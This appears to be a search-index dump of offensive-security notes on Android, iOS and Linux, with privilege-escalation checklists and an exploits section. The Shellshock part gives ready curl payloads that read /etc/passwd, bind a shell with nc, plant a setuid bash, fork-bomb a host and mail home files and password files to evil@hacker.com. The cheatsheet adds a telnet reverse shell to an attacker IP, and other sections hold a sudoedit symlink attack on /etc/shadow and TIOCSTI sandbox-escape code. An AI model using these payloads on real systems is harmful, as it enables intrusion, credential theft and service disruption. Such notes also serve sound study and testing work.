from ADB:"},{"location":"os/android/android/#seccomp-ptrace","text":"Issue 1718: Android: ptrace hole makes seccomp filter useless on devices with kernel 4.8: https://bugs.chromium.org/p/project-zero/issues/detail?id=1718 Chainspotting: Building Exploit Chains with Logic Bugs: https://labs.mwrinfosecurity.com/publications/chainspotting-building-exploit-chains-with-logic-bugs/","title":"seccomp ptrace"},{"location":"os/ios/ios/","text":"IOS Codes *5005*78283# Dial to dump baseband to /Library/Logs/Baseband Use idevicecrashreport to copy to pc ;) https://twitter.com/userlandkernel/status/1081627817975128069 *#5005*5667# Crash commcenter / baseband https://twitter.com/userlandkernel/status/1081630998431977473 References iOS Pentesting Tools Part 3: Frida and Objection: https://www.allysonomalley.com/2018/12/20/ios-pentesting-tools-part-3-frida-and-objection/","title":"IOS"},{"location":"os/ios/ios/#ios","text":"","title":"IOS"},{"location":"os/ios/ios/#codes","text":"","title":"Codes"},{"location":"os/ios/ios/#500578283","text":"Dial to dump baseband to /Library/Logs/Baseband Use idevicecrashreport to copy to pc ;) https://twitter.com/userlandkernel/status/1081627817975128069","title":"*5005*78283#"},{"location":"os/ios/ios/#50055667","text":"Crash commcenter / baseband https://twitter.com/userlandkernel/status/1081630998431977473","title":"*#5005*5667#"},{"location":"os/ios/ios/#references","text":"iOS Pentesting Tools Part 3: Frida and Objection: https://www.allysonomalley.com/2018/12/20/ios-pentesting-tools-part-3-frida-and-objection/","title":"References"},{"location":"os/linux/0-cheatsheet/","text":"Cheatsheet Cheatsheets Bash cheatsheet: https://devhints.io/bash.html Archiving: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/ Essential escalation checks # SUDO sodu -l # New file permissions umask # Scheduled crontab -l ls -alh /var/spool/cron ls -alh /etc/ | grep cron cat /etc/cron* cat /etc/at.* cat /etc/anacrontab cat /var/spool/cron/crontabs/root # Word Writables find -type f -maxdepth 1 -writable # SUID SGID find $DIRECTORY -perm /6000 -exec ls -lah {} \\; # Distribution cat /etc/issue cat /etc/*-release cat /etc/lsb-release cat /etc/redhat-release # Kernel cat /proc/version uname -a rpm -q kernel dmesg | grep Linux # Environment env set cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout # Processes ps -aux | grep root ps -aux | grep root | grep tmux File System File information file filename Type Architecture Debug symbols stripped etc. Shared library dependencies ldd filename File Permissions Setuid - Set User ID The process's effective user ID gets set to that of the program file itself (rather than that of the user running it). S - just the setuid bit s - setuid bit and execute x Dir - No effect on DIRs Setgid - Set Group ID The process's effective group ID gets set to that of the program file (rather than that of the user's primary group). Dir - any files created in that directory will have the same group as that directory http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html Permission Flags r w x 4 2 1 = 7 Changing Permissions chmod g-w ChangeLog chmod 744 ChangeLog Searching With database: updatedb ; locate sbd.exe Withing PATH: which sbd whereis sdb Complex: find / -\u00ad\u2010name sbd* find / --name sdb* --exec file {} \\; ``` #### Search for hidden (dot) files find / -type d -name \".*\" ## Hardware Information ### CPU Information lscpu cat /proc/cpuinfo ### Mounting Devices mount -t mount -t /dev/cdrom /media umount /dev/cdrom ## Process Information ### Running processes ps aux all processes (a) the user (u) processes not associated with a terminal (x) ps -ef ps -eF top Tree of processes (processes threads): pstree -aclp ### Process priority - `-20` is highest priority - `19` is lowest priority nice -n -20 renice ### Memory map for a process cat /proc/1234/maps gdb info proc mappings pmap -d 1234 ### /proc - `/proc/ id /environ` environment variables - `/proc/ id /cmdline` command line args/command used to run the process - `/proc/ id /maps` memory map - `/proc/ id /fd` open file descriptors ### System and library calls - `ltrace` - `strace` ### Access control - `access` - Check permissions for the UID and GID of the process (executable file owner / group) - Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. ### Other killall kill -9 kill fg bg [Ctrl+Z] ## Services ### List of Services cat /etc/services ### Commons service configurations cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk '$1 ~ /^. r. / ### Check if certain service is up: update-\u00ad\u2010rc.d ssh enable ### Auto start a service: update-\u00ad\u2010rc.d ssh enable ### Systemd services Example: /lib/systemd/system/snapd.service ### Systemd socket unit file Example: [Socket] ListenStream=/run/snapd.socket ListenStream=/run/snapd-snap.socket SocketMode=0666 `0666` - Allow any process to connect and communicate with the socket. ## Network Layer ### Interface Information /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network ### Network configuration cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname ### Monitor network communication lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w ### Cached IP and Mac Information arp -e route /sbin/route -nee ### Change IP ifconfig eth0 192.168.1.115 ifconfig eth0 192.168.1.115 netmask 255.255.255.0 broadcast 192.168.1.255 ### Shell with built-in tools nc -lvp 4444### Attacker. Input (Commands) nc -lvp 4445### Attacker. Ouput (Results) telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445### On the targets system. Use the attackers IP! https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ ### DHCP Check `DHCP` page in `protocols` dir. ### DNS Check `DNS` page in `protocols` dir. ### AF_UNIX Used to communicate between processes on the same machine ### AF_INET and AF_INET6 Used for processes to communicate over a network connection. ### Interact with AF_UNIX Socket nc -U /run/snapd.socket GET / HTTP/1.1 Host: 127.0.0.1 ### Tools - Ship: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/ ## OS Information ### Distribution cat /etc/issue cat /etc/*-release cat /etc/lsb-release ### Debian based cat /etc/redhat-release ### Redhat based ### Kernel cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- ### Environment cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set ### Printers lpstat -a ### Sys calls /usr/include /i386-linux-gnu/asm/unistd_32.h ### Kernel tuning Temporary: sysctl Permanent: /etc/sysctl.conf View configuration: sysctl -a |less View configuration files for the installed modprobe modules: ls -l /etc/modprobe.d/ ls -R /lib/modules/$( uname -r )/kernel ### Kernel Modules Insert module: insmod Remove module: modprobe -r rmmod List modules: modprobe -l lsmod ### Installed Applications / Versions ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archivesO ls -alh /var/cache/yum/ ### Scheduled Jobs crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron cat /etc/cron cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root ## Startup Process ![](https://img.wonderhowto.com/img/44/77/63591930046359/0/linux-basics-for-aspiring-hacker-using-start-up-scripts.w1456.jpg) https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/ ### Run levels 0 - halt the system 1 - single user mode (minimal services) 2 - multi-user modes 3 - multi-user mode 4 - multi-user mode 5 - multi-user mode 6 - reboot the system ### Init.d Process - Has process ID: 1 - `/etc/init.d` scripts with 755 permission - init process then hands over the boot-up processes to `rc.d` daemon ### rc.local /etc/init.d/rc.local Script to start necessary processes in the background when the system boots up ## Managing Hard Disks `hda` for hard disks. `sda` for newer SATA disks (SCSI). Partitions within `sda` are `sda1`, `sda2`, ... - Basic disk Information: `df -h` - Partitions on disk: `fdsisk -l` - Block device information: `lsblk` - Editing and displaying partitions: `parted` / `cfdisk` - `(parted) print` - `(parted) select /dev/sdb` - Change HDD parameters: `hdparm` ### Debugfs - Simple-to-use RAM-based file system specially designed for debugging purposes - Mount file system (usable to access `/root` by only being in `disk` group) debugfs /dev/sda1 ## General Text Manipulation Commands cat head tail nl wc grep sed s/ex/ex1/ text.txt sed s/ex/ex1/g text.txt sed s/ex/ex1/3 text.txt ## StdIn StdOut and SrdErr - 0 StdIn - 1 StdOut - 2 SrdErr ## Daemons ### inetd, xinetd Inetd always runs in the background and it then decides when to start and stop other daemons. ### rlinetd rlinetd.conf /etc/rlinetd.d - Disable unnecessary demons - Configure IPs that can access a demon ## Restricted shell - Ref: https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html rbash, or the --restricted or -r Bypass: ssh mindy@10.10.10.51 bash ## Change password (one liner) echo root:password | /usr/sbin/chpasswd ## New line in command line $ echo \"abc[CTRL+M] def\" ## Log file locations - `/var/www/syslog` ## Code execution Files in `SLAPPER_FILES` list will get executed: for i in ${SLAPPER_FILES}; do if [ -f ${i} ]; then file_port=$file_port $i STATUS=1 fi done Should be corrected to: file_port=\"$file_port $i\" Ref: https://www.exploit-db.com/exploits/33899 ## Tmux Connect to existing session: tmux -S /.devs/dev_sess\u200b ## Special File Handling ### 7z files - Print file information: `7z l -slt example.zip` - Extract: `7z x example.zip` ### Microsoft Outlook Personal Folder (PST) - Examine: `readpst -tea -m example.pst` ## Screenshot - Need `video` group access - Resolution: `cat /sys/class/graphics/fb0/virtual_size` - Video feed: Open `\u200b/dev/fb0\u200b` in a image editor cp /dev/fb0 screenshot.raw iraw2png 1024 768 screenshot.raw screenshot.png fbdump ``` References - https://www.kernel.org/doc/Documentation/fb/framebuffer.txt","title":"Cheatsheet"},{"location":"os/linux/0-cheatsheet/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"os/linux/0-cheatsheet/#cheatsheets","text":"Bash cheatsheet: https://devhints.io/bash.html Archiving: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/","title":"Cheatsheets"},{"location":"os/linux/0-cheatsheet/#essential-escalation-checks","text":"# SUDO sodu -l # New file permissions umask # Scheduled crontab -l ls -alh /var/spool/cron ls -alh /etc/ | grep cron cat /etc/cron* cat /etc/at.* cat /etc/anacrontab cat /var/spool/cron/crontabs/root # Word Writables find -type f -maxdepth 1 -writable # SUID SGID find $DIRECTORY -perm /6000 -exec ls -lah {} \\; # Distribution cat /etc/issue cat /etc/*-release cat /etc/lsb-release cat /etc/redhat-release # Kernel cat /proc/version uname -a rpm -q kernel dmesg | grep Linux # Environment env set cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout # Processes ps -aux | grep root ps -aux | grep root | grep tmux","title":"Essential escalation checks"},{"location":"os/linux/0-cheatsheet/#file-system","text":"","title":"File System"},{"location":"os/linux/0-cheatsheet/#file-information","text":"file filename Type Architecture Debug symbols stripped etc.","title":"File information"},{"location":"os/linux/0-cheatsheet/#shared-library-dependencies","text":"ldd filename","title":"Shared library dependencies"},{"location":"os/linux/0-cheatsheet/#file-permissions","text":"","title":"File Permissions"},{"location":"os/linux/0-cheatsheet/#setuid-set-user-id","text":"The process's effective user ID gets set to that of the program file itself (rather than that of the user running it). S - just the setuid bit s - setuid bit and execute x Dir - No effect on DIRs","title":"Setuid - Set User ID"},{"location":"os/linux/0-cheatsheet/#setgid-set-group-id","text":"The process's effective group ID gets set to that of the program file (rather than that of the user's primary group). Dir - any files created in that directory will have the same group as that directory http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html","title":"Setgid - Set Group ID"},{"location":"os/linux/0-cheatsheet/#permission-flags","text":"r w x 4 2 1 = 7","title":"Permission Flags"},{"location":"os/linux/0-cheatsheet/#changing-permissions","text":"chmod g-w ChangeLog chmod 744 ChangeLog","title":"Changing Permissions"},{"location":"os/linux/0-cheatsheet/#searching","text":"","title":"Searching"},{"location":"os/linux/0-cheatsheet/#with-database","text":"updatedb ; locate sbd.exe","title":"With database:"},{"location":"os/linux/0-cheatsheet/#withing-path","text":"which sbd whereis sdb","title":"Withing PATH:"},{"location":"os/linux/0-cheatsheet/#complex","text":"find / -\u00ad\u2010name sbd* find / --name sdb* --exec file {} \\; ``` #### Search for hidden (dot) files find / -type d -name \".*\" ## Hardware Information ### CPU Information lscpu cat /proc/cpuinfo ### Mounting Devices mount -t mount -t /dev/cdrom /media umount /dev/cdrom ## Process Information ### Running processes ps aux all processes (a) the user (u) processes not associated with a terminal (x) ps -ef ps -eF top Tree of processes (processes threads): pstree -aclp ### Process priority - `-20` is highest priority - `19` is lowest priority nice -n -20 renice ### Memory map for a process cat /proc/1234/maps gdb info proc mappings pmap -d 1234 ### /proc - `/proc/ id /environ` environment variables - `/proc/ id /cmdline` command line args/command used to run the process - `/proc/ id /maps` memory map - `/proc/ id /fd` open file descriptors ### System and library calls - `ltrace` - `strace` ### Access control - `access` - Check permissions for the UID and GID of the process (executable file owner / group) - Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. ### Other killall kill -9 kill fg bg [Ctrl+Z] ## Services ### List of Services cat /etc/services ### Commons service configurations cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk '$1 ~ /^. r. / ### Check if certain service is up: update-\u00ad\u2010rc.d ssh enable ### Auto start a service: update-\u00ad\u2010rc.d ssh enable ### Systemd services Example: /lib/systemd/system/snapd.service ### Systemd socket unit file Example: [Socket] ListenStream=/run/snapd.socket ListenStream=/run/snapd-snap.socket SocketMode=0666 `0666` - Allow any process to connect and communicate with the socket. ## Network Layer ### Interface Information /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network ### Network configuration cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname ### Monitor network communication lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w ### Cached IP and Mac Information arp -e route /sbin/route -nee ### Change IP ifconfig eth0 192.168.1.115 ifconfig eth0 192.168.1.115 netmask 255.255.255.0 broadcast 192.168.1.255 ### Shell with built-in tools nc -lvp 4444### Attacker. Input (Commands) nc -lvp 4445### Attacker. Ouput (Results) telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445### On the targets system. Use the attackers IP! https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ ### DHCP Check `DHCP` page in `protocols` dir. ### DNS Check `DNS` page in `protocols` dir. ### AF_UNIX Used to communicate between processes on the same machine ### AF_INET and AF_INET6 Used for processes to communicate over a network connection. ### Interact with AF_UNIX Socket nc -U /run/snapd.socket GET / HTTP/1.1 Host: 127.0.0.1 ### Tools - Ship: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/ ## OS Information ### Distribution cat /etc/issue cat /etc/*-release cat /etc/lsb-release ### Debian based cat /etc/redhat-release ### Redhat based ### Kernel cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- ### Environment cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set ### Printers lpstat -a ### Sys calls /usr/include /i386-linux-gnu/asm/unistd_32.h ### Kernel tuning Temporary: sysctl Permanent: /etc/sysctl.conf View configuration: sysctl -a |less View configuration files for the installed modprobe modules: ls -l /etc/modprobe.d/ ls -R /lib/modules/$( uname -r )/kernel ### Kernel Modules Insert module: insmod Remove module: modprobe -r rmmod List modules: modprobe -l lsmod ### Installed Applications / Versions ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archivesO ls -alh /var/cache/yum/ ### Scheduled Jobs crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron cat /etc/cron cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root ## Startup Process ![](https://img.wonderhowto.com/img/44/77/63591930046359/0/linux-basics-for-aspiring-hacker-using-start-up-scripts.w1456.jpg) https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/ ### Run levels 0 - halt the system 1 - single user mode (minimal services) 2 - multi-user modes 3 - multi-user mode 4 - multi-user mode 5 - multi-user mode 6 - reboot the system ### Init.d Process - Has process ID: 1 - `/etc/init.d` scripts with 755 permission - init process then hands over the boot-up processes to `rc.d` daemon ### rc.local /etc/init.d/rc.local Script to start necessary processes in the background when the system boots up ## Managing Hard Disks `hda` for hard disks. `sda` for newer SATA disks (SCSI). Partitions within `sda` are `sda1`, `sda2`, ... - Basic disk Information: `df -h` - Partitions on disk: `fdsisk -l` - Block device information: `lsblk` - Editing and displaying partitions: `parted` / `cfdisk` - `(parted) print` - `(parted) select /dev/sdb` - Change HDD parameters: `hdparm` ### Debugfs - Simple-to-use RAM-based file system specially designed for debugging purposes - Mount file system (usable to access `/root` by only being in `disk` group) debugfs /dev/sda1 ## General Text Manipulation Commands cat head tail nl wc grep sed s/ex/ex1/ text.txt sed s/ex/ex1/g text.txt sed s/ex/ex1/3 text.txt ## StdIn StdOut and SrdErr - 0 StdIn - 1 StdOut - 2 SrdErr ## Daemons ### inetd, xinetd Inetd always runs in the background and it then decides when to start and stop other daemons. ### rlinetd rlinetd.conf /etc/rlinetd.d - Disable unnecessary demons - Configure IPs that can access a demon ## Restricted shell - Ref: https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html rbash, or the --restricted or -r Bypass: ssh mindy@10.10.10.51 bash ## Change password (one liner) echo root:password | /usr/sbin/chpasswd ## New line in command line $ echo \"abc[CTRL+M] def\" ## Log file locations - `/var/www/syslog` ## Code execution Files in `SLAPPER_FILES` list will get executed: for i in ${SLAPPER_FILES}; do if [ -f ${i} ]; then file_port=$file_port $i STATUS=1 fi done Should be corrected to: file_port=\"$file_port $i\" Ref: https://www.exploit-db.com/exploits/33899 ## Tmux Connect to existing session: tmux -S /.devs/dev_sess\u200b ## Special File Handling ### 7z files - Print file information: `7z l -slt example.zip` - Extract: `7z x example.zip` ### Microsoft Outlook Personal Folder (PST) - Examine: `readpst -tea -m example.pst` ## Screenshot - Need `video` group access - Resolution: `cat /sys/class/graphics/fb0/virtual_size` - Video feed: Open `\u200b/dev/fb0\u200b` in a image editor cp /dev/fb0 screenshot.raw iraw2png 1024 768 screenshot.raw screenshot.png fbdump ``` References - https://www.kernel.org/doc/Documentation/fb/framebuffer.txt","title":"Complex:"},{"location":"os/linux/important-files/","text":"Important Files / Folders Private keys ~/.ssh/id_rsa APT sources /etc/apt/sources.list Order of name resolution /etc/nsswitch.conf DNS Hosts File /etc/hosts DNS sever Information /etc/resolv.conf Kernel module config /etc/sysctl.conf Sys calls /usr/include /i386-linux-gnu/asm/unistd_32.h OS version info /etc/issue /proc/version Cron /etc/crontab Bootloader - GRUB2 Main configuration file (replaces menu.lst in GRUB (v1)) /boot/grub/grub.cfg Directory contains the scripts that build the grub.cfg /etc/grub.d 00_header - Loads the settings from /etc/default/grub 05_debian_theme - Defines the colors, background, etc. 10_linux - Loads the menu entries 20_memtest86 - Loads the memory tester 30_os-prober - Scans the hard drives for other operating systems 40_custom - Template for manually adding other menu entries File contains the GRUB menu settings /etc/default/grub Run update-grub after modifying. Samba /etc/samba/smb.conf Syslog /etc/rsyslog.conf Log mail events of all priorities to /var/log/mail. mail.* /var/log/mail *.emerg * Log all events of the emergency priority (emerg) to all logged on users. Squid Proxy /etc/squid/squid.conf /etc/squid/passwords Apache /etc/apache2/sites-enabled/000-default.conf /etc/apache/sites-enabled/000-default.conf /etc/httpd/sites-enabled/000-default.conf TFTPD /etc/default/tftpd-hpa","title":"Important Files / Folders"},{"location":"os/linux/important-files/#important-files-folders","text":"","title":"Important Files / Folders"},{"location":"os/linux/important-files/#private-keys","text":"~/.ssh/id_rsa","title":"Private keys"},{"location":"os/linux/important-files/#apt-sources","text":"/etc/apt/sources.list","title":"APT sources"},{"location":"os/linux/important-files/#order-of-name-resolution","text":"/etc/nsswitch.conf","title":"Order of name resolution"},{"location":"os/linux/important-files/#dns-hosts-file","text":"/etc/hosts","title":"DNS Hosts File"},{"location":"os/linux/important-files/#dns-sever-information","text":"/etc/resolv.conf","title":"DNS sever Information"},{"location":"os/linux/important-files/#kernel-module-config","text":"/etc/sysctl.conf","title":"Kernel module config"},{"location":"os/linux/important-files/#sys-calls","text":"/usr/include /i386-linux-gnu/asm/unistd_32.h","title":"Sys calls"},{"location":"os/linux/important-files/#os-version-info","text":"/etc/issue /proc/version","title":"OS version info"},{"location":"os/linux/important-files/#cron","text":"/etc/crontab","title":"Cron"},{"location":"os/linux/important-files/#bootloader-grub2","text":"","title":"Bootloader - GRUB2"},{"location":"os/linux/important-files/#main-configuration-file-replaces-menulst-in-grub-v1","text":"/boot/grub/grub.cfg","title":"Main configuration file (replaces menu.lst in GRUB (v1))"},{"location":"os/linux/important-files/#directory-contains-the-scripts-that-build-the-grubcfg","text":"/etc/grub.d 00_header - Loads the settings from /etc/default/grub 05_debian_theme - Defines the colors, background, etc. 10_linux - Loads the menu entries 20_memtest86 - Loads the memory tester 30_os-prober - Scans the hard drives for other operating systems 40_custom - Template for manually adding other menu entries","title":"Directory contains the scripts that build the grub.cfg"},{"location":"os/linux/important-files/#file-contains-the-grub-menu-settings","text":"/etc/default/grub Run update-grub after modifying.","title":"File contains the GRUB menu settings"},{"location":"os/linux/important-files/#samba","text":"/etc/samba/smb.conf","title":"Samba"},{"location":"os/linux/important-files/#syslog","text":"/etc/rsyslog.conf Log mail events of all priorities to /var/log/mail. mail.* /var/log/mail *.emerg * Log all events of the emergency priority (emerg) to all logged on users.","title":"Syslog"},{"location":"os/linux/important-files/#squid-proxy","text":"/etc/squid/squid.conf /etc/squid/passwords","title":"Squid Proxy"},{"location":"os/linux/important-files/#apache","text":"/etc/apache2/sites-enabled/000-default.conf /etc/apache/sites-enabled/000-default.conf /etc/httpd/sites-enabled/000-default.conf","title":"Apache"},{"location":"os/linux/important-files/#tftpd","text":"/etc/default/tftpd-hpa","title":"TFTPD"},{"location":"os/linux/important-issues/","text":"Exploits CVE-2014-6271 - Shellshock Bash 4.3 and earlier Execute commands from environment variables unintentionally. Caused by Bash processing trailing strings after function definitions in the values of environment variables. Exploitable when attacker has control of environment variables. GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1 User-Agent: Netsparker Host: shellshock.testsparker.com Referer: () { :;}; echo NS: $( /etc/passwd) Test if Vulnerable env x='() { :;}; echo OOPS' bash -c : env x='() { :;}; echo vulnerable' bash -c echo not-vulnerable Explanation To run a command in a new shell bash -c ls New shell inherits environment If new shell finds what seems to be a function in an environment variable: New shell executes the function to get the actual value When function is executed, evaluation didn\u2019t stop when the end of the function definition is reached. Hence, when new shell sees () { :;}; , bash will start executing the function and proceed to also execute the echo . Samples Passwd curl -A '() { :;}; echo Content-Type: text/plain ; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status curl -H user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' \\ http://192.168.1.14/cgi-bin/status Directory Listing curl -A '() { :;}; echo Content-Type: text/plain ; echo; /bin/ls /' http://192.168.1.14/cgi-bin/status Reverse shell curl -A '() { :; }; /bin/bash -c /usr/bin/nc -lvvp 2345 -e /bin/bash ' http://192.168.1.14/cgi-bin/status Setuid shell () { :; }; cp /bin/bash /tmp/bash chmod 4755 /tmp/bash Fork Bomb () { :; }; :(){ :|: };: Ping Bot () { :; }; ping -s 1000000 victim IP Data Theft () { :; }; find ~ -print | mail -s Your files evil@hacker.com () { :; }; cat ~/.secret/passwd | mail -s This password file evil@hacker.com Exploitation Vectors Ref: https://github.com/opsxcq/exploit-CVE-2014-6271 CGI Bash will receive the environment variables passed by the server Server passes various details of the request to a handler program in the environment variable list. For example, HTTP_USER_AGENT . exploit/multi/http/apache_mod_cgi_bash_env_exec Apache mod_cgi - 'Shellshock' Remote Command Injection OpenSSH ForceCommand will execute a fixed command on login If user specify a command to run, user specific command is put into environment ( SSH_ORIGINAL_COMMAND ) Bash will parse SSH_ORIGINAL_COMMAND on start-up, and run the commands DHCP clients Some DHCP clients can also pass commands to Bash Malicious DHCP server provide, a string crafted to execute code (in an addition option) Qmail server Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash. IBM HMC restricted shell References Shellshock: How does it actually work? [Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability Practice https://pentesterlab.com/exercises/cve-2014-6271 [Docker] Shellshock exploit + vulnerable environment HTB - Shocker CVE-2014-7169 CVE-2014-0160 - Heartbleed Exploits: - https://github.com/sensepost/heartbleed-poc References https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/ CVE-2016-4971 - GNU Wget 1.18 - Arbitrary File Upload / Remote Code Execution issuing a crafted HTTP 30X Redirect containing FTP server reference in response wget will automatically follow the redirect wget will download a malicious file from the FTP server (to current dir) wget will fail to rename the file to the originally requested filename will not work with -O However, By saving .wgetrc in /home/victim/.wgetrc could set arbitrary wget settings such as destination directory Exploits: - https://www.exploit-db.com/exploits/40064 OpenSSH =6.6 SFTP misconfiguration Exploit: - https://github.com/SECFORCE/sftp-exploit References: - https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/ Practice: - HTB - Nightmare Privilege Escalation CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering pam_motd (aka the MOTD module) in libpam-modules Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory. \"user file stamps\" and the motd.legal-notice file. Exploits: - https://www.exploit-db.com/exploits/14339 - https://www.exploit-db.com/exploits/14273 - https://twitter.com/jonoberheide/status/18009527979 Practice: - HTB - Popcorn CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation RHEL 5/6/7 / Ubuntu Sudo = 1.8.14 When /etc/sudoers reads: user_to_grant_priv ALL=(root) NOPASSWD: sudoedit /home/*/*/test.txt Sudoedit does not check the full path if a wildcard is used twice (e.g. /home/ / /file.txt), Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow). Example: - /home/ user_to_grant_priv /newdir , test.txt pointing to /etc/shadow - ln -sf /etc/shadow /home/ user_to_grant_priv /newdir/test.txt - Then do sudoedit /home/ user_to_grant_priv /newdir/test.txt - OR sudoedit -u user_to_grant_priv /home/ user_to_grant_priv /newdir/test.txt - https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh Usages: - Expose /etc/shadow - Expose \u200bauthorized_keys over HTTP cd /var/www/testing/writeup ln -s /home/alekos/.ssh/authorized_keys layout.html References: - https://www.exploit-db.com/exploits/37710 Practice: - https://github.com/t0kx/privesc-CVE-2015-5602 - HTB - Jocker CVE-2016-7545 - SELinux sandbox escape When executing a program via the SELinux sandbox The nonpriv session can escape to the parent session By using the TIOCSTI ioctl to push characters into the terminal's input buffer #include unistd.h #include sys/ioctl.h int main() { char *cmd = id\\n ; while(*cmd) ioctl(0, TIOCSTI, cmd++); execlp( /bin/id , id , NULL); } $ gcc test.c -o test $ /bin/sandbox ./test id References - https://seclists.org/oss-sec/2016/q3/606 CVE-2017-1000112 - UFO Linux kernel Ubuntu Trusty 4.4.0-* Ubuntu Xenial 4-8-0-* Ubuntu Xenial (16.04) 4.4.0-81 References: - https://www.openwall.com/lists/oss-security/2017/08/13/1 - https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html Exploit: - https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112 Practice: - HTB - Nightmare","title":"Important issues"},{"location":"os/linux/important-issues/#exploits","text":"","title":"Exploits"},{"location":"os/linux/important-issues/#cve-2014-6271-shellshock","text":"Bash 4.3 and earlier Execute commands from environment variables unintentionally. Caused by Bash processing trailing strings after function definitions in the values of environment variables. Exploitable when attacker has control of environment variables. GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1 User-Agent: Netsparker Host: shellshock.testsparker.com Referer: () { :;}; echo NS: $( /etc/passwd)","title":"CVE-2014-6271 - Shellshock"},{"location":"os/linux/important-issues/#test-if-vulnerable","text":"env x='() { :;}; echo OOPS' bash -c : env x='() { :;}; echo vulnerable' bash -c echo not-vulnerable","title":"Test if Vulnerable"},{"location":"os/linux/important-issues/#explanation","text":"To run a command in a new shell bash -c ls New shell inherits environment If new shell finds what seems to be a function in an environment variable: New shell executes the function to get the actual value When function is executed, evaluation didn\u2019t stop when the end of the function definition is reached. Hence, when new shell sees () { :;}; , bash will start executing the function and proceed to also execute the echo .","title":"Explanation"},{"location":"os/linux/important-issues/#samples","text":"Passwd curl -A '() { :;}; echo Content-Type: text/plain ; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status curl -H user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' \\ http://192.168.1.14/cgi-bin/status Directory Listing curl -A '() { :;}; echo Content-Type: text/plain ; echo; /bin/ls /' http://192.168.1.14/cgi-bin/status Reverse shell curl -A '() { :; }; /bin/bash -c /usr/bin/nc -lvvp 2345 -e /bin/bash ' http://192.168.1.14/cgi-bin/status Setuid shell () { :; }; cp /bin/bash /tmp/bash chmod 4755 /tmp/bash Fork Bomb () { :; }; :(){ :|: };: Ping Bot () { :; }; ping -s 1000000 victim IP Data Theft () { :; }; find ~ -print | mail -s Your files 